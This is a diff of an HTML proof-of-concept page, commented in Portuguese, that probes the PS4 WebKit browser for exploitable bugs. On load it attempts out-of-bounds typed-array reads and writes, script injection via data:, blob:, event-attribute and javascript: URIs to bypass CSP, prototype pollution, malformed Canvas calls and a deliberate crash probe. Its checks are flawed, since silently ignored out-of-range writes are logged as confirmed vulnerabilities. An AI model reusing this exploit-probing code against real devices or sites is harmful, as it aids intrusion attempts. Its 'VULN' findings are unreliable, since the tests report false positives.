@@ -1,218 +1,242 @@
 <!DOCTYPE html>
 <html>
-
 <head>
     <meta charset="UTF-8">
-    <title>Vulnerability Test Script</title>
+    <title>PS4 WebKit PoC - Leak Invest + Canvas Link</title>
     <style>
-        body {
-            font-family: monospace;
-            white-space: pre-wrap;
-        }
-
-        #output {
-            margin-top: 20px;
-            padding: 10px;
-            border: 1px solid #ccc;
-            background-color: #f8f8f8;
-        }
-
-        .critical {
-            color: magenta;
-            font-weight: bold;
-        }
-
-        .warning {
-            color: orange;
-        }
-
-        .success {
-            color: green;
-        }
-
-        .error {
-            color: red;
-        }
-
-        .info {
-            color: blue;
-        }
+        /* Estilos CSS */
+        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 12px; }
+        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 80vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        .log-info { color: #6cf; }
+        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; }
+        .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; }
+        .log-vuln { color: #ff4444; font-weight: bold; } /* Vermelho vivo */
+        .log-leak { color: #FF9800; font-weight: bold; } /* Laranja para leaks potenciais */
+        .log-ptr { color: #f0f; font-weight: bold; }  /* Magenta para ponteiros potenciais */
+        .log-good { color: #4CAF50; }
+        .log-warn { color: #FFC107; }
+        .log-error { color: #f44336; }
     </style>
 </head>
-
 <body>
-    <h1>Vulnerability Test Script</h1>
-    <div id="output"></div>
+    <h1>PS4 WebKit PoC - Investigação de Leak + Teste Canvas 2D</h1>
+    <p>Foco: Investigar leak 0xAAAA..., adicionar teste Canvas especulativo via link.</p>
+    <div id="controls">
+         <span id="js-link-placeholder" style="color:orange; display: block; margin: 10px;">[Link para Teste Canvas será injetado aqui]</span>
+    </div>
+    <div id="poc-output"></div>
+    <canvas id="exploit-canvas" width="10" height="10" style="border:1px solid #555; display: none;"></canvas> <script>
+        let outputDiv = document.getElementById('poc-output');
+        const log = (message, type = 'info') => { /* Função log igual anterior */
+             if (!outputDiv) return; try { const t=`[${new Date().toLocaleTimeString()}]`; const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000); outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;} outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`; outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}
+        };
+        const PAUSE_DURATION = 300;
 
-    <script>
-        const log = (message, type = 'info') => {
-            const outputDiv = document.getElementById('output');
-            outputDiv.innerHTML += `<span class="${type}">${new Date().toLocaleTimeString()} - ${message}\n</span>`;
+        // Heurística de Ponteiro Simples
+        const isPotentialPointer64 = (high, low) => {
+             if(high===null||low===null||typeof high!=='number'||typeof low!=='number')return false;
+             if(high===0&&low===0)return false; // Ignora nulo
+             if(high===0xFFFFFFFF&&low===0xFFFFFFFF)return false; // Ignora -1
+             // Ignorar o padrão AAAA específico que vimos
+             if(high===0xAAAAAAAA&&low===0xAAAAAAAA)return false;
+             // Heurística: High diferente de 0 ou Low grande/ímpar (menos comum para dados alinhados)
+             return high > 0 || (low > 0xFFFF && low !== 0xAAAAAAAA); // Ajustado
+         };
+        const toHex = (val, bits = 32) => { if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};
+
+
+        // --- Funções de Teste ---
+
+        // Teste 1: Investigação dos Leaks OOB @ Offsets Específicos (32, 52) + Leitura Ampla
+        const runOOBInvestigateLeakOffsets = async () => {
+            log("--- Iniciando Teste 1: Investigação Leak OOB @ Offsets 32, 52 ---", 'test');
+            try {
+                const bufferSize = 128; // Manter buffer maior
+                const buffer = new ArrayBuffer(bufferSize);
+                const u8view = new Uint8Array(buffer);
+                const dataView = new DataView(buffer);
+                // Offsets em bytes *relativos ao FIM do buffer* onde 0xAAAA... foi visto
+                // Convertendo para offsets absolutos a partir do INÍCIO do buffer para DataView
+                const leakCheckOffsets = [bufferSize + 32, bufferSize + 52];
+                const writePattern = 0xCAFEBABE; // Padrão diferente para escrita/verificação
+
+                // Confirmar OOB Write básico primeiro
+                log("Confirmando OOB Write básico @ -1...", 'subtest');
+                try { u8view[-1] = 0xDD; log("OOB Write @ -1 OK.", 'good'); }
+                catch (e) { log("FALHA OOB Write @ -1. Continuando com cuidado...", 'warn'); /* Não abortar */ }
+
+                // A. Tentar Escrever e Verificar nos Offsets do Leak
+                for (const targetOffset of leakCheckOffsets) {
+                    log(`Verificando controle de escrita/leitura no offset absoluto ${targetOffset}...`, 'subtest');
+                    let initialValueLow = null, initialValueHigh = null;
+                    try { // Ler valor inicial (pode ser AAAA...)
+                         initialValueLow = dataView.getUint32(targetOffset, true);
+                         initialValueHigh = dataView.getUint32(targetOffset + 4, true);
+                         log(` -> Valor inicial @${targetOffset}: H=${toHex(initialValueHigh)} L=${toHex(initialValueLow)}`, 'info');
+                    } catch(e) { log(` -> Erro ao ler valor inicial @${targetOffset}: ${e.message}`, 'warn');}
+
+                    try { // Tentar escrever
+                        dataView.setUint32(targetOffset, writePattern, true); // Escreve padrão (parte baixa)
+                        dataView.setUint32(targetOffset + 4, 0, true);      // Zera parte alta
+                        log(` -> Escrita OOB (setUint32 ${toHex(writePattern)}) realizada em ${targetOffset} (sem erro).`, 'warn');
+
+                        // Ler de volta imediatamente
+                        const readBackLow = dataView.getUint32(targetOffset, true);
+                        const readBackHigh = dataView.getUint32(targetOffset + 4, true);
+                        if (readBackLow === writePattern && readBackHigh === 0) {
+                            log(`    VULN: Leitura pós-escrita confirmou ${toHex(readBackLow)}! Controle de escrita OOB OK.`, 'vuln');
+                        } else {
+                            log(`    AVISO: Leitura pós-escrita: H=${toHex(readBackHigh)} L=${toHex(readBackLow)} (Esperado H=0 L=${toHex(writePattern)})`, 'warn');
+                        }
+                    } catch (e) {
+                        log(` -> ERRO/BLOQUEIO na escrita/leitura OOB U32 no offset ${targetOffset}: ${e.message}`, 'good');
+                    }
+                     await new Promise(resolve => setTimeout(resolve, 50)); // Pausa
+                } // Fim loop offsets de escrita/verificação
+
+                // B. Leitura Ampla ao Redor
+                log(`Testando LEITURA OOB ampla ao redor da área dos leaks...`, 'subtest');
+                const readWindowCenter = bufferSize + 42; // Ponto central entre 32 e 52
+                const readWindowBytes = 256;
+                const startReadOffset = readWindowCenter - (readWindowBytes / 2);
+                let foundPotentialLeak = false;
+                log(`Lendo ${readWindowBytes} bytes (offset ${startReadOffset} a ${startReadOffset + readWindowBytes})...`, 'info');
+
+                for(let i = 0; i < readWindowBytes / 8; i++) { // Ler em blocos de 8 bytes
+                    const currentByteOffset = startReadOffset + (i * 8);
+                     try {
+                         // Ler como U64 (simulado)
+                         const low = dataView.getUint32(currentByteOffset, true);
+                         const high = dataView.getUint32(currentByteOffset + 4, true);
+                         const u64Str = `H=${toHex(high)} L=${toHex(low)}`;
+
+                         if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) { /* Ignorar AAAA */ }
+                         else if (high !== 0 || low !== 0) {
+                             log(`  Leak U64? @Byte ${currentByteOffset}: ${u64Str}`, 'leak');
+                             if (isPotentialPointer64(high, low)) {
+                                 log(`    >> POTENCIAL PONTEIRO!`, 'ptr'); // Usar classe 'ptr' para magenta
+                                 foundPotentialLeak = true;
+                             }
+                         }
+                     } catch(e) {} // Ignorar erros de leitura fora dos limites "reais"
+                     // Adicionar pausa mínima para não travar em loop longo
+                      if (i % 8 === 0) await new Promise(resolve => setTimeout(resolve, 5));
+                }
+                 if (!foundPotentialLeak) { log("    Nenhum ponteiro/dado OOB suspeito encontrado na leitura ampla.", 'info'); }
+
+            } catch (e) { log(`Erro GERAL no teste OOB Investigate Leak: ${e.message}`, 'warn'); }
+            log("--- Teste 1 Concluído ---", 'test');
         };
 
-        async function vulnerabilityTest() {
-            log("Iniciando Teste de Vulnerabilidades Combinado (OOB Write e CSP Bypass)", 'critical');
+        // Teste 2: Teste Especulativo Canvas 2D (Chamado pelo Link)
+        const attemptCanvasExploit = async () => {
+             log("--- Iniciando Teste 2: Canvas 2D Exploit Attempt (Especulativo) ---", 'test');
+             try {
+                 const canvas = document.getElementById('exploit-canvas');
+                 if (!canvas) { log("Canvas 'exploit-canvas' não encontrado.", 'error'); return; }
+                 const ctx = canvas.getContext('2d');
+                 if (!ctx) { log("Contexto 2D não obtido.", 'error'); return; }
+                 log("Contexto Canvas 2D obtido.", 'info');
 
-            // ====================== Fase 1: Teste de OOB Write ======================
-            log("\nFase 1: Teste de OOB Write", 'warning');
-            await testOOBWrite();
+                 log("Tentando drawImage com valores extremos...", 'subtest');
+                 try { ctx.drawImage(canvas, -10000, -10000, 0xFFFFFFFF, 0xFFFFFFFF); log("drawImage extremo OK (?).", 'warn'); } catch (e) { log(`Erro drawImage: ${e.message}`, 'good'); }
+                  await new Promise(resolve => setTimeout(resolve, 50));
 
-            // ====================== Fase 2: Teste de CSP Bypass ======================
-            log("\nFase 2: Teste de CSP Bypass", 'warning');
-            await testCSPBypass();
+                 log("Tentando putImageData inconsistente...", 'subtest');
+                  try { const smallBuffer=new Uint8ClampedArray(10*10*4/2); const badImageData=new ImageData(smallBuffer, 10, 10); ctx.putImageData(badImageData, 0, 0); log("putImageData inconsistente OK (?).", 'warn'); } catch (e) { log(`Erro putImageData: ${e.message}`, 'good'); }
+                   await new Promise(resolve => setTimeout(resolve, 50));
 
-            // ====================== Fase 3: Teste Combinado ======================
-            log("\nFase 3: Teste Combinado (OOB Write + CSP Bypass)", 'warning');
-            await testCombinedExploit();
+                  log("Tentando createPattern inválido...", 'subtest');
+                  try { const invalidSource = document.createElement('div'); ctx.createPattern(invalidSource, 'repeat'); log("createPattern inválido OK (?).", 'warn'); } catch (e) { log(`Erro createPattern: ${e.message}`, 'good'); }
+                   await new Promise(resolve => setTimeout(resolve, 50));
 
-            log("\nTeste de Vulnerabilidades Concluído. Consulte os logs para obter detalhes.", 'critical');
-        }
+                  log("Tentando obter contexto 2D muitas vezes...", 'subtest');
+                  try { for (let i=0; i<50; i++){ canvas.getContext('2d'); } log("getContext repetido OK.", 'info'); } catch(e) { log(`Erro getContext repetido: ${e.message}`, 'error'); }
 
-        async function testOOBWrite() {
-            log("\nIniciando Teste de OOB Write...", 'info');
+             } catch (e) { log(`Erro GERAL no teste Canvas Exploit: ${e.message}`, 'warn'); }
+             log("--- Teste 2 Concluído ---", 'test');
+        };
 
-            const bufferSize = 64;
-            const buffer = new ArrayBuffer(bufferSize);
-            const view = new Uint8Array(buffer);
-            const writeOffsets = [-1, 0, bufferSize - 1, bufferSize, bufferSize + 1, bufferSize + 8];
-            const writeValue = 0xAA;
+        // Função para adicionar o link que chama o teste do Canvas
+        const addCanvasLinkTest = () => {
+             log("Adicionando link para teste manual do Canvas 2D...", 'info');
+             try {
+                const canvasLink = document.createElement('a');
+                canvasLink.href = "javascript:attemptCanvasExploit();"; // Chama a função de teste
+                canvasLink.textContent = "[Clique AQUI para Testar Canvas 2D Exploit (Especulativo)]";
+                canvasLink.style.cssText='display:block;margin:10px;padding:5px;border:1px solid cyan;color:cyan;';
+                const placeholder = document.getElementById('js-link-placeholder');
+                if(placeholder) placeholder.replaceWith(canvasLink); else document.getElementById('controls').appendChild(canvasLink);
+                log("Link para teste Canvas adicionado.", 'warn');
+            } catch (e) { log(`Erro ao criar link Canvas:: ${e.message}`, 'warn'); }
+        };
 
-            for (const offset of writeOffsets) {
-                try {
-                    log(`  Tentando escrever 0x${writeValue.toString(16)} no offset ${offset}...`, 'info');
-                    view[offset] = writeValue;
-                    log(`  Escrita no offset ${offset} bem-sucedida.`, 'success');
 
-                    // Leitura para verificar o efeito
-                    for (let i = -1; i <= bufferSize + 1; i++) {
-                        try {
-                            const readValue = view[i];
-                            log(`    Leitura no offset ${i}: 0x${readValue.toString(16)}`, 'info');
-                        } catch (readError) {
-                            log(`    Erro ao ler no offset ${i}: ${readError.message}`, 'error');
-                        }
-                    }
+        // Teste 3: CSP Bypass (Confirmação e Setup do Link Canvas)
+        const runCSPConfirmation = () => {
+             log("--- Iniciando Teste 3: CSP Bypass (Confirmação e Setup Link Canvas) ---", 'test');
+             log("Injetando script data: URI (simples log)...", 'info');
+             try{const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJDU1AgQnlwYXNzIGRhdGE6IFVSaSBCw6FzaWNvIE9LIiwgImdvb2QiKTs='; /* log('CSP Bypass data: URI Básico OK', 'good'); */ document.body.appendChild(s);}catch(e){}
+             log("Injetando img onerror (simples log)...", 'info');
+             try{const i=document.createElement('img');i.src='x';i.onerror=()=>{log("CSP Bypass onerror Básico OK!",'good');};document.body.appendChild(i);}catch(e){}
 
-                } catch (error) {
-                    log(`  Erro ao escrever no offset ${offset}: ${error.message}`, 'error');
-                }
-            }
+             addCanvasLinkTest(); // Adiciona o link para o teste manual do Canvas
 
-            log("Teste de OOB Write Concluído.", 'info');
-        }
+             log("--- Teste 3 Concluído ---", 'test');
+        };
 
-        async function testCSPBypass() {
-            log("\nIniciando Teste de CSP Bypass...", 'info');
+        // Teste 4: Prototype Pollution (Confirmação)
+        const runPPBasic = () => { /* Mantido igual */
+             log("--- Iniciando Teste 4: PP Básico (Confirmação) ---", 'test'); const k='__pp_test_confirm__',v='PPOK';try{log(`Poluindo['${k}']...`,'info');Object.prototype[k]=v;const t={'w':window,'n':{}};let c=0;for(const n in t){try{if(t[n]&&t[n][k]===v){log(`VULN: PP básica OK! ${n}.${k}=${t[n][k]}`,'vuln');c++;}}catch(e){}} if(c>0)log(`Confirmado:${c} obj(s).`,'vuln');else log(`Aviso:Ñ confirmou PP.`,'warn'); try{delete Object.prototype[k];log("Limpou PP.",'info');}catch(e){}}catch(e){} log("--- Teste 4 Concluído ---",'test');
+        };
 
-            const cspBypassAttempts = [{
-                    type: 'data_uri',
-                    code: 'YWxlcnQoIlZQdW4gYmF5cGFzcyBkbyBDU1AhIik7' // alert("Vupun bypass do CSP!")
-                },
-                {
-                    type: 'blob_uri',
-                    code: 'YWxlcnQoIlZQdW4gYmxvYiBieXBhc3MhIik7' // alert("Vupun blob bypass!")
-                },
-                {
-                    type: 'event_attribute',
-                    element: 'img',
-                    event: 'onload',
-                    code: 'YWxlcnQoIlZQdW4gb25sb2FkIGJ5cGFzcyEiKTs=' // alert("Vupun onload bypass!")
-                },
-                {
-                    type: 'javascript_uri',
-                    element: 'a',
-                    uri: 'javascript:alert(\\'Vupun javascript bypass!\\');',
-                    text: 'Clique aqui para bypassar CSP'
-                }
+        // Teste 5: OOB Write Básico (Confirmação)
+        const runOOBTestU8_Confirm = async () => { /* Mantido igual */
+            log("--- Iniciando Teste 5: OOB Write (Uint8 Confirmação) ---", 'test'); try {const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,20));}}catch(e){} log("--- Teste 5 Concluído ---", 'test');
+        };
+
+        // Teste 6: OOB Crash Probe (Opcional)
+        const runOOBCrashProbe = async () => {
+            log("--- Iniciando Teste 6: OOB Crash Probe ---", 'test');
+            log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 2000));
+            try { const b=new ArrayBuffer(32),v=new Uint8Array(b); const o=-30000; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=0xFE; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn'); }
+            catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); } log("--- Teste 6 Concluído (se não travou) ---", 'test');
+        };
+
+
+        // --- Função Principal de Execução ---
+        const runAllTests = async () => {
+            log("Iniciando testes de PoC (Leak Invest + Canvas Link v4)...");
+            // Testes removidos: Corrupt Adjacent, PP Function Impact, UAF, TC, Env Probe
+            const tests = [
+                runOOBInvestigateLeakOffsets, // Teste 1 - Investigar Leak 0xAAAA...
+                runCSPConfirmation,           // Teste 2 - Confirmar CSP + Adicionar Link Canvas
+                runPPBasic,                   // Teste 3 - Confirmar PP
+                runOOBTestU8_Confirm,       // Teste 4 - Confirmar OOB Básico
+                runOOBCrashProbe              // Teste 5 - Crash Probe (Opcional)
             ];
+             const totalTests = tests.length;
+             log(`Total de ${totalTests} testes automáticos na sequência.`);
 
-            for (const attempt of cspBypassAttempts) {
-                try {
-                    if (attempt.type === 'data_uri') {
-                        const script = document.createElement('script');
-                        script.src = 'data:text/javascript;base64,' + attempt.code;
-                        document.body.appendChild(script);
-                        log(`  Tentativa de bypass via data: URI...`, 'info');
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-
-                    } else if (attempt.type === 'blob_uri') {
-                        const code = atob(attempt.code);
-                        const blob = new Blob([code], {
-                            type: 'text/javascript'
-                        });
-                        const url = URL.createObjectURL(blob);
-                        const script = document.createElement('script');
-                        script.src = url;
-                        document.body.appendChild(script);
-                        log(`  Tentativa de bypass via blob: URI...`, 'info');
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-
-                    } else if (attempt.type === 'event_attribute') {
-                        const element = document.createElement(attempt.element);
-                        element.setAttribute(attempt.event, atob(attempt.code));
-                        if (attempt.element === 'img') {
-                            element.src = 'invalid-image.jpg'; // Forçar o evento
-                        }
-                        document.body.appendChild(element);
-                        log(`  Tentativa de bypass via atributo ${attempt.event} em ${attempt.element}...`, 'info');
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-
-                    } else if (attempt.type === 'javascript_uri') {
-                        const link = document.createElement(attempt.element);
-                        link.href = attempt.uri;
-                        link.textContent = attempt.text;
-                        document.body.appendChild(link);
-                        log(`  Tentativa de bypass via javascript: URI em ${attempt.element}...`, 'info');
-                        // Neste caso, requer interação do usuário
-                    }
-
-                    log(`  Bypass de CSP via ${attempt.type} bem-sucedido (verifique os alertas).`, 'success');
-
-                } catch (error) {
-                    log(`  Falha ao tentar bypass de CSP via ${attempt.type}: ${error.message}`, 'error');
-                }
+            for(let i=0; i < tests.length; i++){
+                 if (!outputDiv) { console.error("Output div NULO, parando testes."); break; }
+                 try {
+                     log(`--- EXECUTANDO TESTE ${i+1}/${totalTests} ---`, 'test');
+                     const testFn = tests[i]; const result = testFn();
+                     if (result instanceof Promise) { await result; }
+                 } catch(testError) { log(`ERRO INESPERADO TESTE ${i+1}: ${testError.message} ${testError.stack}`, 'error'); }
+                 if (i < tests.length - 1 && outputDiv) {
+                    log(`Pausa ${PAUSE_DURATION}ms...`, 'info'); await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
+                 }
             }
+            if(outputDiv) log("\n\nTodos os testes automáticos concluídos. Verifique o link do Canvas.", 'test');
+            else console.error("Script concluído, mas div log não disponível.");
+        };
 
-            log("Teste de CSP Bypass Concluído.", 'info');
-        }
+        // Executar ao carregar a página
+        document.addEventListener('DOMContentLoaded', runAllTests);
 
-        async function testCombinedExploit() {
-            log("\nIniciando Teste Combinado (OOB Write + CSP Bypass)", 'info');
-
-            // Passo 1: OOB Write (Simulação de Corrupção)
-            log("\nPasso 1: Tentativa de OOB Write para Corrupção", 'info');
-            try {
-                const bufferSize = 64;
-                const buffer = new ArrayBuffer(bufferSize);
-                const view = new Uint8Array(buffer);
-                const writeOffset = bufferSize + 4; // Fora do limite
-                const writeValue = 0x41; // "A"
-
-                view[writeOffset] = writeValue;
-                log(`  Tentativa de OOB Write bem-sucedida (offset ${writeOffset}).`, 'success');
-
-            } catch (error) {
-                log(`  Falha na tentativa de OOB Write: ${error.message}`, 'error');
-                return; // Se o OOB Write falhar, não continue
-            }
-
-            // Passo 2: CSP Bypass (Execução de Código Arbitrário)
-            log("\nPasso 2: Tentativa de Bypass de CSP após OOB Write", 'info');
-            try {
-                const script = document.createElement('script');
-                script.src = 'data:text/javascript;base64,YWxlcnQoIlZQdW4gY29tYm8hIik7'; // alert("Vupun combo!")
-                document.body.appendChild(script);
-                log(`  Bypass de CSP bem-sucedido via data: URI (após OOB Write).`, 'success');
-
-            } catch (error) {
-                log(`  Falha no Bypass de CSP após OOB Write: ${error.message}`, 'error');
-            }
-
-            log("Teste Combinado Concluído.", 'info');
-        }
-
-        document.addEventListener('DOMContentLoaded', vulnerabilityTest);
     </script>
-</body>
 
+</body>
 </html>
